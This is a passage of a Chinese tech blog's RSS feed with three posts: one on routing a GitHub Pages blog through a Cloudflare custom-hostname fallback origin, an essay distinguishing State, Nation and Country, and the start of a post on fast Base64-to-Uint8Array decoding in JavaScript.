.text-italic{font-family:'d2-3332111211-font-italic'}@font-face{font-family:d2-3332111211-font-italic;src:url(data:application/font-woff;base64,d09GRgABAAAAAA+oAAoAAAAAF+AAARhRAAAAAAAAAAAAAAAAAAAAAAAAAABPUy8yAAAA9AAAAGAAAABgW1SVeGNtYXAAAAFUAAAArgAAAOYEAgVLZ2x5ZgAAAgQAAAjrAAAMKABZjDRoZWFkAAAK8AAAADYAAAA2G7Ur2mhoZWEAAAsoAAAAJAAAACQLeAjMaG10eAAAC0wAAACgAAAAoER6Altsb2NhAAAL7AAAAFIAAABSQSA+gG1heHAAAAxAAAAAIAAAACAAQAD2bmFtZQAADGAAAAMmAAAIMgntVzNwb3N0AAAPiAAAACAAAAAg/8YAMgADAeEBkAAFAAACigJY//EASwKKAlgARAFeADIBIwAAAgsFAwMEAwkCBCAAAHcAAAADAAAAAAAAAABBREJPAAEAIP//Au7/BgAAA9gBESAAAZMAAAAAAeYClAAAACAAA3icfM07K0YBAMbx3/Ee9+N+vx+XGclilGyy8AXIJKWUkq8j4QMYTPgaNqOBzfyoM5neZ3mWX/1RaClQKX2gViub37Bl245de/YdOnbq3KVrt0kj1m3+EweOnDhz4cpNks/85iff+cp73vKalzznKY95yH3ummb7FVatWbSktmxFh5ZSpy7devTq068yYNCQYSNGjRk3YdKUaTNmzZm3wB8AAAD//wEAAP//kBErNQAAeJx8Vn9sG2f5f973LneJ4/ywzznHrh3HPvvOP8527LN9cRzbcZzfsdMmadq0TdK03fpd++2+y359t6ntNlaYymBVmCokpgkGm9DQBELdPyCxTWwDIkYnQB1iwPiDjQxWpLEoDJiWO/Se3STtH/xzsu49P8/z+Tyf5/O80AB+APx/+DJQ0ARtYIUOAIXzUpSiqoKdUiRJYFlV4jjW/xhae+xpunz4z8Fn/y176NHPfWfyb8sv4stbZ9Cji488oh25ePvtB69f18LoN9cBALD+JgB6G69CE1gAOFaRRFESGAYhhRMkgX2v73UTbaJpp6L9At12uDJt/csp9NDKSup0b/Z/tGm8urVy9SoAgqy+iaP4GfAANPhEMZ0qYCXJ21lRFHytuMPG80oyo9oZBvkm78j0HD5f6Z3uzHAZse/ooN83kQuWuwX/orn84FT18gOjajjULeVve7A/t5ju3pP0RIHkEABwO16FZgM/62UVVmC9rHABnW7R3gt/3PqRgsRWvFp6e/CTwdr36Cm8Cg3ke4UiX079P7K14NWtK/Vz/CO8Cg7jnLMrKqdQApfJqAJLCRThgaWEC4tZnh55ffHCZKXJaab3/ljO8zTT2jiBV7WvX7yIjm+toHvk05GntOfRwlPyKVm7VI99Eq8CdyN2JmNE34469dUwzbSahicvVC9HaKbNNIJXtYUvJu5U0MLWCnruSeV0UvuGgdusbyINPwNhALtPlFSDy3RKlCRCdCazTTTDdNh4u53nO2wM80F5JZh1z6n909FAJZxLL+Ryyx7FMRILpN0JfyWeyp009/VFIsmhXn+SjznH1eRMMhWMdYU8PXvEOB91jap9R1KAYBEAp/EqsASLoHpZgfr2/a+0oDdbXr0fV8vlrZcMLYGkb6J/oQ2wEfR237YIFFWhBFVgGCmZUdVtRbw0UJEnlhQpb6G5wrFiIy3MW8W9frkj6fKX056E+cjcyEMLStCb15xjgfhALP6O6AuPLyaL+Vo+j76J/o7XoINMCGFGYAVOYVnFoKTD1oqlZAGnU4QZluX5D6W8hbIVL1UlHvv3R430aX853dUT8k0LMZtiDnrzeO2VZXfk8AGSeiA8vqgU8uHAB6Kvhg9Lu/Lt4PvvAPusVLtYXa0jnArcilDqPvrKVu+tEDEE9E30KtoAJwR25yPdZb3M9kRRSoaogaB8/8Cp6ORCj1rqMjdobzR1l8PurL3LPf01HVPWkJBeMp8+NrwyI8f2JV1Ka3FfwGFROjwo0NzZ4kp45gBBBAA9ia+B3eh1Ee9WF0sGjorMFZtL7W1TeWfYuse0x+INNVqOm0/MoReyDdMTsy3NKmtKRmYL2jzpEdL9aANtgAdiu9Wrqgwj3KwQhqFuYu/FxAHB7xoOFiZaHeL+eH5fZHwhIRYsFFc8yd2bFaZ9ET7hEkpKV/wPojtt91UG7hDlA3Pl+w4liWaooyeRNxL+pegLjcz35HJgzJIHAP0Wr9VnfkcrrDH46RSBSXkuVXva6dCMXEg3Fir9ND3mGosN47XreSFe6vX4tZ8j2dbZMhmOaS/oOokJn+IrWCR9AgbEMQDQdf3zugT/NN5LtffDtRpkfRM+xWtgJYykU8QXyOTW23lniTlbPY+QhWJYZOLNRYsD/+/WV9gmyopwjqa3ceAP0QbxBIKjBsNeB8PchGY3sGNFlhZnxb5EQ3w+kM/QdKGap+nRjjF5mOAc4cciw2h93J9Qg7JS6rV02XZj3fm1wyXagM7dNdxKJckYmondxKSR4VYidzzk92gD2sC9W/O1YTZ0Xre5a3uX5Iml5N6j8uRSODqtZJLkYb7jyPC9c7Hac2BwZWhwtLwyNDiyXe85tAHtu+q1s+KNOptpdyXq6NjT7vRXPHm0vijnm4YaizntKiD9M30TnUcbpJM3e/CtFkwcuGbAzyUWHT32ATGcD/XGsvK4HJtwxTjFKyYy3YVUz4w5FRQ9wZjglDzOQihSCvi7gjZn1NMlWn39cnQoQGru1zfRPD4DrjobGZVMpWJMIslVF80PB1I0yo42V/ylPWfN57OUy9fqbLa0x83FaJuzBVmzDY8/XtA+tFq7ukwNKttGYvfqm+gjtE5m4UbsHSVydUt7cVslY+5RebhCjDq43zyoWjwcymjXOAdpH5rXnBOCYmhTvwaAfl2LK3CSYud5Y/2pCmsX6vcLlpV/d2Qq3NjK0m3dbXOzayf2yo0WE93u45YQfv8ML3XYQh1n/vHxPXyM52X7vSTua3ocvYfWwQnAGj0wjIRSuHoCTkGtmDF1tzqs1kDJYZ2tiA2NFG0JWL9c0f7kyI39imWzTfmkgD7QPvJWBaHiQ5atj+NVuVb3JwDoe2gdmgAEFZFFhxTW1IjK77agfKP2smaW0blCVPtCoabVsL6J3sJPgAW8BoO7DHrX6jHMbC05GgiPL6eTI/7Q+NGEVE655ZjxNPeeKBz65rnRvhOFw8+eHckP3X1xqHxw+O6LQ4MHARGs6FH8sHHnUcn2zagKpbDOli8t322aU3P3PWYeQH9Mmn1brw3cwPAGfoL8T1ALVH35SdsbkfWypsblS0txJd1d8knywZ6Z+fDMuVlkM8emzx4/FJP7vZ4eMXRoKL20vDI2SHASsVzFD4MJbABeQfWqiNQgBBSV3JUYhkWTY4L21ya0tH/frHlW038iMlaWtgVt30+hp7WVQuFld8nrSnXWeGvXN9HP8BPQBjIAV9NwJlUfbe5GZzM3VoRRu1H8k6lk5z4B5ZKBfn97atiW6i4kDxRbvLPekTl1KafujUT33Ym+q5Z88Wa7eXguPqF5eryhvvLZmYAwP1U8NaAeLx57/oHBmofa9U24CGcItzX918xzhHdILr4zYHbxTtnNO2TC6w/0ZfQt/FOgAFikoDF0pVerPkud/OzpbT+Gq2idnJO7pudY9Tha15zG2SiehCv4CsnD7crzINcl2G1uAU/aeYe3k3d0AzJ2xltonXDO7mxLYy4TdsHiMNnaXV7TXdW7WsvvmJqyDJuIYP/WuyMH/gMAAP//AQAA//+YMINTAAABAAAAARhReMI39V8PPPUAAQPoAAAAANhdoMwAAAAA3WYvN/69/t0IHQPJAAIAAwACAAAAAAAAAAEAAAPY/u8AAAhA/r39vAgdA+gAwv/RAAAAAAAAAAAAAAAoAnQAJADIAAAB/v/LAiYAOQH3ACMBzgAjAsEAIwJrACMB+gAMAf4AXQIZACcCGAAfAhcAJwHhACUBGgArAhMAAQILAB8A7QAfAO7/hAD4ACwDHwAfAg0AHwIDACcBVgAfAZL//AFFADwCEAA4Aa3/1AHA/8IBmv/2AeAAKgHgABoB4P/2AeAADwHgABAA8gAXAVT/uADtAB8AAABHAO7/hAAAAC4ALgBSAIQAnACsANoBAAFAAVQBjAHEAfwCNgJeAqYC0ALcAugDCgNMA3YDpAPCA/4ELARYBIQEtATMBP4FFgVABWgFrAXCBdIF4AX2BhQAAAABAAAAKACMAAwAZgAHAAEAAAAAAAAAAAAAAAAABAADeJyclNtOG1cUhj8H2216uqhQRG7QvkylZEyjECXhypSgjIpw6nF6kKpKgz0+iPHMyDOYkifodd+ib5GrPkafoup1tX8vgx1FQSAE/Hv2OvxrrX9tYJP/2KBWvwv83ZwbrrHd/NnwHb5oHhneYL/5meE6Dxv/GG4waLw13ORBo2v4E97V/zT8KU/qvxm+y1b90PDnPK5vGv5yw/Gv4a94wrsFrsEz/jBcY4vC8B02+dXwBvewmLU699gx3OBrtg032QZ6TKhImZAxwjFkwogzZiSURCTMmDAkYYAjpE1Kpa8ZsZBj9MGvMREVM2JFHFPhSIlIiSkZW8S38sp5rYxDnWZ216ZiTMyJPE6JyXDkjMjJSDhVnIqKghe0aFHSF9+CipKAkgkpATkzRrTocMgRPcZMKHEcKpJnFpEzpOKcWPmdWfjO9EnIKI3VGRkD8XTil8g75AhHh0K2q5GP1iI8xPGjvD23XLbfEujXrTBbz7tkEzNXP1N1JdXNuSY41q3P2+YH4YoXuFv1Z53J9T0a6H+lyCecaf4DTSoTkwzntmgTSUGRu49jX+eQSB35iZAer+jwhp7Obbp0aXNMj5CX8u3QxfEdHY45kEcovLg7lGKO+QXH94Sy8bET689iYgm/U5i6S3GcqY4phXrumQeqNVGFN5+w36F8TR2lfPraI2/pNL9MexYzMlUUYjhVL5faKK1/A1PEVLX42V7d+22Y2+4tt/iCXDvs1brg5Ce3YHTdVIP3NHOun4CYATknsuiTM6VFxYV4vybmjBTHgbr3SltS0b708XkupJKEqRiEZIozo9Df2HQTGff+mu6dvSUD+Xump5dV3SaLU6+uZvRG3VveRdblZGUCLZtqvqKmvrhmpv1EO7XKP5Jvqdct5xGh4i52+0OvwA7P2WWPsbL0dTO/vPOvhLfYUwdOSWQ1lKZ9DY8J2CXgKbvs8pyn7/VyycYZH7fGZzV/mwP26bB3bTUL2w77vFyL9vHMf4ntjupxPLo8Pbv1NB/cQLXfaN+u3s2uJuenMbdoV9txTMzUc3FbqzW5+wT/AwAA//8BAAD//3KhUUAAAAADAAD/9QAA/84AMgAAAAAAAAAAAAAAAAAAAAAAAAAA)}.connection,.shape{stroke-linejoin:round}.shape{shape-rendering:geometricPrecision}.connection{stroke-linecap:round}.d2-3332111211 .fill-N1{fill:#170206}.d2-3332111211 .fill-N2{fill:#535152}.d2-3332111211 .stroke-B1{stroke:#023324}</style><g id="myhost"><g class="shape"><ellipse cx="-102.5" cy="167.5" class="shape stroke-B1" rx="94.5" ry="31.5" style="fill:#ebfdf7;stroke-width:2"/></g><text x="-102.5" y="173" class="text-bold fill-N1" style="text-anchor:middle;font-size:16px">i.hsfzxjy.site</text></g><g id="cf" class="cf-box"><path fill="#fff8dc" stroke="#deb887" d="M12 12h510v311H12z" class="shape" style="stroke-width:2"/><text x="267" y="310" class="fill-N1" style="font-family:'d2-3332111211-font-regular';text-anchor:middle;font-size:28px">Cloudflare</text></g><g id="github"><g class="shape"><ellipse cx="657.5" cy="167.5" fill="#add8e6" stroke="#00008b" class="shape" rx="115.5" ry="38.5" style="stroke-width:2"/></g><text x="657.5" y="173" class="text-bold fill-N1" style="text-anchor:middle;font-size:16px">hsfzxjy.github.io</text></g><g id="cf.edge" class="cf-box"><path fill="#fff8dc" stroke="#deb887" d="M72 72h143v191H72z" class="shape" style="stroke-width:2"/><text x="143.5" y="165" class="text-bold fill-N1" style="text-anchor:middle;font-size:16px"><tspan x="143.5" dy="0">104.19.22.121</tspan><tspan x="143.5" dy="18.5">边缘节点</tspan></text></g><g id="cf.origin" class="cf-box"><path fill="#fff8dc" stroke="#deb887" d="M255 72h207v82H255z" class="shape" style="stroke-width:2"/><text x="358.5" y="110.5" class="text-bold fill-N1" style="text-anchor:middle;font-size:16px"><tspan x="358.5" dy="0">SSL/TLS</tspan><tspan x="358.5" dy="18.5">自定义主机名</tspan></text></g><g id="cf.mid" class="cf-box"><g class="shape"><ellipse cx="358.5" cy="228.5" fill="#fff8dc" stroke="#deb887" class="shape" rx="103.5" ry="34.5" style="stroke-width:2"/></g><text x="358.5" y="234" class="text-bold fill-N1" style="text-anchor:middle;font-size:16px">gh.monad.run</text></g><g id="cf.(edge -&gt; origin)[0]" class="cf-box"><marker id="mk-1790844558" markerHeight="12" markerUnits="userSpaceOnUse" markerWidth="10" orient="auto" refX="7" refY="6" viewBox="0 0 10 12"><path fill="#deb887" stroke-width="2" d="m0 0 10 6-10 6z" class="connection"/></marker><path fill="none" stroke="#deb887" marker-end="url(#mk-1790844558)" d="m216.443 148.526 35.17-8.578" class="connection" mask="url(#d2-3332111211)" style="stroke-width:2"/></g><g id="cf.(origin -&gt; mid)[0]" class="cf-box"><path fill="none" stroke="#deb887" marker-end="url(#mk-1790844558)" d="m358.525 155.5.426 34.5" class="connection" mask="url(#d2-3332111211)" style="stroke-width:2"/><path fill="#fff8dc" d="M330 163h58v21h-58z"/><text x="359" y="179" class="text-italic fill-N2" style="text-anchor:middle;font-size:16px">回退源</text></g><g id="(cf.mid -&gt; github)[0]"><marker id="mk-3488378134" markerHeight="12" markerUnits="userSpaceOnUse" markerWidth="10" orient="auto" refX="7" refY="6" viewBox="0 0 10 12"><path stroke-width="2" d="m0 0 10 6-10 6z" class="connection" style="fill:#023324"/></marker><path fill="none" marker-end="url(#mk-3488378134)" d="m448.956 210.58 106.133-22.742" class="connection stroke-B1" mask="url(#d2-3332111211)" style="stroke-width:2"/><text x="503" y="205" class="text-italic fill-N2" style="text-anchor:middle;font-size:16px">CNAME</text></g><g id="(myhost -&gt; cf.edge)[0]"><path fill="none" marker-end="url(#mk-3488378134)" d="M-6 168h74" class="connection stroke-B1" mask="url(#d2-3332111211)" style="stroke-width:2"/><text x="32.5" y="174" class="text-italic fill-N2" style="text-anchor:middle;font-size:16px">A 记录</text></g><mask id="d2-3332111211" width="972" height="313" x="-198" y="11" maskUnits="userSpaceOnUse"><path fill="#fff" d="M-198 11h972v313h-972z"/><path fill="rgba(0,0,0,0.75)" d="M-147.5 157h90v21h-90zM206.5 282h121v36h-121zM598 157h119v21H598zM94.5 149h98v37h-98zM298.5 94.5h120v37h-120zM307.5 218h102v21h-102z"/><path d="M330 163h58v21h-58zM479 189h48v21h-48zM7 158h51v21H7z"/></mask></svg></svg></figure><p >以下从右到左解释整个流程：</p><ol><li>首先，我们需要有一个辅助域名在 Cloudflare 上解析。本例中的辅助域名是 monad.run。我们新增一条 CNAME 记录，指向 hsfzxjy.github.io。如此一来，便可用 gh.monad.run 访问 Github Pages 上的内容。</li><li>其次，也是最关键的一步，我们需要让 i.hsfzxjy.site 主域名收到的请求都转发至 gh.monad.run。为完成这一步，需要在 Cloudflare 的 “SSL/TLS -&gt; 自定义主机名”设置中，配置回退源为 gh.monad.run 及主机名为 i.hsfzxjy.site。</li><li>最后，我们添加一条从主域名 i.hsfzxjy.site 到边缘节点 104.19.22.121 的 A 记录，从而将主域名的请求转发至 Cloudflare，再由 Cloudflare 转发至后续的处理服务。此处的 104.19.22.121 即所谓的“Cloudflare 优选 IP”，经由其可优化从国内的访问速度。此类 IP 的列表随时可能变化，最新的一批可在 <a href="https://ip.164746.xyz/">ip.164746.xyz</a> 中查询。注意这一步不要求主域名 i.hsfzxjy.site 在 Cloudflare 上解析，只需要在原有的 DNS 服务商（如 DNSPod）上操作即可。</li></ol><p >步骤 1 和 步骤 3 都是标准的 DNS 操作，不再赘述。以下重点说说步骤 2 的操作。</p><h1 id="如何配置-cloudflare-的自定义主机名回退源">如何配置 Cloudflare 的自定义主机名回退源</h1><p >在开始前，我们需要再明确一下此步中涉及的两个域名：主域名 i.hsfzxjy.site 和辅助域名 gh.monad.run。前者面向客户端，后者连接我们真正的服务器。读者需清楚了解这两个域名的关系，并替换为自己的情形，以免操作失误。</p><p >首先，我们找到回退源的设置。该设置位于“SSL/TLS -&gt; Custom HostNames”下。如果是首次使用，Cloudflare 会要求你开通 Cloudflare for SaaS 服务，绑定信用卡开通即可，这个服务的免费额度足够我们使用。在右边的“Fallback Origin”中输入我们的<strong>辅助域名</strong> gh.monad.run，然后点击“Add Fallback Origin”。</p><p ><img loading="lazy" src="../assets/2024-09-14-cloudflare-blog-acceleration/step1.png" alt=""></p><p >完成后点击“Add Custom Hostname”，跳转至另一个界面添加<strong>主域名</strong> i.hsfzxjy.site。</p><p ><img loading="lazy" src="../assets/2024-09-14-cloudflare-blog-acceleration/step3.png" alt=""></p><p >随后回到上一步。此时我们的设置已经生效，但主域名的状态为 Pending。</p><p ><img loading="lazy" src="../assets/2024-09-14-cloudflare-blog-acceleration/step4.png" alt=""></p><p >Pending 状态意味着 Cloudflare 需要我们进一步验证方能确认 i.hsfzxjy.site 确实为我们所持有。验证的具体步骤需要我们在主域名的服务商处添加两条 TXT 记录，内容为上图所示。以下是在 DNSPod 中的添加截图。</p><p ><img loading="lazy" src="../assets/2024-09-14-cloudflare-blog-acceleration/step5.png" alt=""></p><p >添加完成后回到 Cloudflare 界面，点击“Refresh”按钮。稍等片刻，状态提示变成“The hostname is using Cloudflare and cannot be activated with an TXT or HTTP validation token. To activate the custom hostname, the DNS target needs to point to the SaaS zone.”这说明验证已生效，但还需一步将主域名的 DNS 解析指向辅助域名，即添加一条 CNAME 记录，将 i.hsfzxjy.site 指向 gh.monad.run。</p><p ><img loading="lazy" src="../assets/2024-09-14-cloudflare-blog-acceleration/step6.png" alt=""></p><p >再稍等片刻，状态提示变成“Active”即表示设置成功。</p><p ><img loading="lazy" src="../assets/2024-09-14-cloudflare-blog-acceleration/step7.png" alt=""></p><p >至此，正常的回退源配置已经完成，我们可以删除之前的两条 TXT 记录，因为它们只用于临时验证。随后我们<strong>修改 i.hsfzxjy.site 到 gh.monad.run 的 CNAME 记录为 到优选 IP 104.19.22.121 的 A 记录</strong>，从而让主域名的请求经由 Cloudflare 的优选 IP 加速访问，即可完成整个流程。</p><style>img {max-height: 300px} .image-col-2 > * { max-width: max(49%, 300px)!important; min-width: 200px; } .post__content { word-break: break-all }</style><div class="footnotes"><ol><li class="footnote" id="fn:1">如下图一。事实上这是2024年9月的测试结果，几个月前的情况远比这严重</li></ol></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Blog/">Blog</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Cloudflare/">Cloudflare</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Network-Optimization/">Network Optimization</category>
      
      
      <comments>https://i.hsfzxjy.site/cloudflare-blog-acceleration/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>辩义 State、Nation 与 Country</title>
      <link>https://i.hsfzxjy.site/disambiguiate-state-nation-country/</link>
      <guid>https://i.hsfzxjy.site/disambiguiate-state-nation-country/</guid>
      <pubDate>Fri, 09 Aug 2024 10:26:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;State、Nation 与 Country，汉语皆常译为“国家”。事实上在当代英文的多数使用场景中，这三个词的的确确可互换表达相同的意思。但在某些场合中，表达者会斟酌其细微语义差别以突出重点，此时若再通译为“国家”，难免有些不准确，乃至引起不必要的误会。&lt;/p&gt;
&lt;h2</description>
        
      
      
      
      <content:encoded><![CDATA[<p >State、Nation 与 Country，汉语皆常译为“国家”。事实上在当代英文的多数使用场景中，这三个词的的确确可互换表达相同的意思。但在某些场合中，表达者会斟酌其细微语义差别以突出重点，此时若再通译为“国家”，难免有些不准确，乃至引起不必要的误会。</p><h2 id="state">State</h2><p ><a href="https://en.wikipedia.org/wiki/State_(polity)">State</a> 指的是拥有固定领土与人口的<strong>政治实体</strong>，<strong>政府</strong>的存在被认为是现代 State 成立的先决条件。当用 State 指代一个政治实体时，语者通常强调的是它的政府。美国由 50 个州组成，每个州有自己独立的州政府，“州”在英语里名为 State，这也是 United States of America 的由来。这种政府组织形式被称为联邦制（Federation），即若干成员单位共同组成联邦，构成国际交往的主体。一套共同的联邦宪法赋予了联邦政府外交、军事、财政等主要权力，并规定了成员单位间的权限划分。</p><p >State 在学术上并没有一个各方公认的定义，这也使其在讨论中常常含义不明，而不严谨的翻译更是将此等模糊性成倍地放大。Walter Scheidel 指出了 State 当前的诸多主流定义有如下共同点：</p><blockquote><p >[A state has] centralized institutions that impose rules, and back them up by force, over a territorially circumscribed population <small>（State 有中心化的机构对一个有界领土人口施加规则并通过武力支持这些规则）</small>; a distinction between the rulers and the ruled <small>（State 区分了统治者与被统治者）</small>; and an element of autonomy, stability, and differentiation <small>（State 蕴含了自治、稳定与差异化的要素）</small>. <sup id="fnref:1"><a href="#fn:1">1</a></sup></p></blockquote><p >通俗来说，State 像是一个弱化版的汉语语境下的“国”——有领土人口，有施于其上的规则（如法律，但不一定）和规则的强制者。但由于历史原因，现代汉语语用者倾向于认为“国是一个个互不交叉重叠的个体”，以致产生“佛罗里达是美国的国中之国”这般怪诞感。若是理解为春秋时期的诸侯国，反而会更顺理成章些。汉语现代意义下理解的“国”则有另一个 <a href="https://en.wikipedia.org/wiki/Sovereign_state">Sovereign State</a>，可直接对译为“主权国家”而不产生歧义。与 State 的含糊不同，Sovereign State 是一个在国际法中有着明确定义的概念。中华人民共和国和美利坚合众国都是 Sovereign State，但佛罗里达不是，这便与我们认知中的“国”相符了。</p><p >总体上看，State 在汉语没有一个相对应的概念。State 强调一个政治实体的政府或统治阶层，为方便汉语语用者的理解，通常可根据所指的特点翻译成“国”、“州”或“邦”等熟悉的概念。</p><h2 id="nation">Nation</h2><p ><a href="https://en.wikipedia.org/wiki/Nation">Nation</a> 指的是具有共享身份认同的人群共同体。这种身份认同可以是基于相同的文化、语言、历史乃至信仰，划清了共同体内外成员的界限。</p><p >在现代，Nation 与主权国家几乎是一一对应的，因而 Nation 常翻译为“国族”。19世纪至今的一系列“民族解放运动”<sup id="fnref:2"><a href="#fn:2">2</a></sup>是这一现状的重要推动力量，在广袤的亚非拉地区，享有身份认同的人们反抗殖民者，建立起了自己的主权国家。因此 Nation 也常用于指涉国家，并侧重于强调构成该国家的人群。</p><p >Nation 被译为“国族”，但不等同于“民族”。汉语的“民族”更接近于 <a href="https://en.wikipedia.org/wiki/Ethnicity">Ethnic Group</a>（族群），即彼此共享了相同的祖先、血缘、外貌、历史、文化、习俗、语言、地域、宗教、生活习惯等而形成的一个共同群体。如“中华民族”是一个 Nation，但其包含了汉族、回族等 56 个 Ethnic Group。有些表述会将 Nation 和 Ethnic Group 皆译为“民族”，这其实源于近代日本译者翻译欧洲著作时所用<ruby>民族<rp>(</rp><rt>みんぞく</rt><rp>)</rp></ruby>一词。为避免混淆，二者还是不要译为同一个名词。</p><p >Nation 区别于 Ethnic Group，在于其身份认同的基础可以是抽象的。这种抽象的认同可以将不同 Ethnic Group 聚合为同一个 Nation，如前文所述的中华民族，又如美国人是追寻“美国梦”的多族裔共同体。这种认同还可以把同一个 Ethnic Group 中的部分人排除在 Nation 之外。例如德意志第三帝国时期，其 Nation 的构成基础为<a href="https://en.wikipedia.org/wiki/Ethnicity">纳粹主义</a>，认为雅利安人是最高等的种族。但若有雅利安人不认可纳粹主义，他们也被视为本 Nation 的敌人而被排除在外。说到纳粹，有一个翻译上的插曲：纳粹主义的全称 Nationalsozialismus 常被译为“国社主义”，但纳粹其实既不“国家”，也不“社会主义”。“国社主义”中的“国”译自 National-，与国家毫无关系，而是作为修饰表明纳粹主义的一切思想都是基于是否为雅利安人的区分。</p><h2 id="country">Country</h2><p ><a href="https://en.wikipedia.org/wiki/Country">Country</a> 更多是个地理的概念，指涉广泛，涵盖主权国家、加盟国、属地、争议领土等多种概念。Country 侧重于强调所指实体的领土，其山川河流等地理特征。</p><p >Country 的定义也是模糊的。这种模糊性不在于指涉，而在于划分。假如有一种划分方式，将地球的所有领土划分成确定的部分并使所有人信服，则每一部分被称为一个 Country 是无可争议的。但问题在于划分方式是主观的、政治的，世界上总有一些实体的成立不为所有人认可，如科索沃地区和台湾地区。Country 的指涉是中立的地理概念，这使得所有的实体，无论被承认与否，都可用同一个词指代。但这种指代的“一视同仁”还是会引发争端——“我都不承认它的存在了，凭什么还用同一个词称呼？”因此，Country 的定义不清不是学术性的，而是政治性的。</p><h2 id="更多混乱">更多混乱</h2><p >State、Nation 和 Country 的混乱，一方面在于三个舶来概念被映射到同一个中文词汇，导致翻译后指涉不明。同样是“国家”一词，英文选词不同，侧重点也不同，乃至最后表达的意思也大相径庭。因此，在理解相关句子时，还需根据选词揣摩其表意。</p><p >但即便考虑到了三个词的细微差异，也不见得能准确领会语者的本意。近年来，即便在英语中，这三者也有诸多混用的现象。这一方面在于三者概念互有重叠，另一方面，英语日常交流的双方也不见得会意识到其中的差别，便直接当同义词使用了。语者的不白，译者的不明，让本就不易理解的句子更是蒙上了一层厚纱。</p><div class="footnotes"><ol><li class="footnote" id="fn:1">Scheidel, Walter (2013). “Studying the State”. The Oxford Handbook of the State in the Ancient Near East and Mediterranean. Oxford University Press. pp. 5–58.</li><li class="footnote" id="fn:2">此为官方叫法，但其实“国族解放运动”更为合适。</li></ol></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Sociology/">Sociology</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Etymology/">Etymology</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Politics/">Politics</category>
      
      
      <comments>https://i.hsfzxjy.site/disambiguiate-state-nation-country/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>将 Base64 编码的数据快速转换为 Uint8Array</title>
      <link>https://i.hsfzxjy.site/fast-conversion-from-base64-binary-to-uint8-array/</link>
      <guid>https://i.hsfzxjy.site/fast-conversion-from-base64-binary-to-uint8-array/</guid>
      <pubDate>Sun, 04 Aug 2024 09:26:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;为了方便节省请求数，有时我们会将二进制数据以 Base64 编码的形式嵌入 HTML 或 JavaScript 中，再于运行时解码成 Uint8Array，进行后续运算。然而浏览器没有提供直接的 API 来完成这种解码转换，需要我们自己实现。本文介绍两种快速的解码方法。&lt;</description>
        
      
      
      
      <content:encoded><![CDATA[<p >为了方便节省请求数，有时我们会将二进制数据以 Base64 编码的形式嵌入 HTML 或 JavaScript 中，再于运行时解码成 Uint8Array，进行后续运算。然而浏览器没有提供直接的 API 来完成这种解码转换，需要我们自己实现。本文介绍两种快速的解码方法。</p><h2 id="数据准备">数据准备</h2><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">const</span> data = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>({ <span class="hljs-attr">length</span>: <span class="hljs-number">100</span> * <span class="hljs-number">1024</span> }, <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">256</span>))</span><br><span class="line"><span class="hljs-keyword">const</span> raw = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(...data)</span><br><span class="line"><span class="hljs-keyword">const</span> b64data = <span class="hljs-title function_">btoa</span>(raw)</span><br></pre></div></div><p >为测试不同解码方法的性能，我们生成了一组 100KB 的随机数据，并将其转换为 Base64 编码的字符串 <code>b64data</code>。<code>b64data</code> 将作为解码函数的输入，以测试不同解码方法的性能。</p><h2 id="方法一：循环拷贝">方法一：循环拷贝</h2><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">function</span> <span class="hljs-title function_">decode1</span>(<span class="hljs-params">b64data</span>) {</span><br><span class="line">  <span class="hljs-keyword">const</span> raw = <span class="hljs-title function_">atob</span>(b64data)</span><br><span class="line">  <span class="hljs-keyword">const</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(raw.<span class="hljs-property">length</span>)</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; raw.<span class="hljs-property">length</span>; i++) buf[i] = raw.<span class="hljs-title function_">charCodeAt</span>(i)</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> buf</span><br><span class="line">}</span><br></pre></div></div><p >方法一最为直接。首先使用 <code>atob</code> 函数将 <code>b64data</code> 解码为包含原始数据的字符串 <code>raw</code>，再通过一个循环拷贝 <code>raw</code> 的各个字符点位到字节数组 <code>buf</code> 中。这种方式的计算密集部分都是由 JS 完成的，尽管 V8 引擎有 JIT，运行性能仍是不理想：</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&quot;decode1&quot;</span>)</span><br><span class="line"><span class="hljs-title function_">decode1</span>(b64data)</span><br><span class="line"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&quot;decode1&quot;</span>) <span class="hljs-comment">// decode1: 1.2431640625 ms</span></span><br></pre></div></div><h2 id="方法二：使用-textencoder">方法二：使用 TextEncoder</h2><blockquote><p ><strong>注意</strong> 该方法解码的结果和原始数据是不等价的，请阅读下面分析后再决定是否使用。</p></blockquote><p  class="par"></p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">function</span> <span class="hljs-title function_">decode2</span>(<span class="hljs-params">b64data</span>) {</span><br><span class="line">  <span class="hljs-keyword">const</span> raw = <span class="hljs-title function_">atob</span>(b64data)</span><br><span class="line">  <span class="hljs-keyword">const</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(raw.<span class="hljs-property">length</span> * <span class="hljs-number">2</span>)</span><br><span class="line">  <span 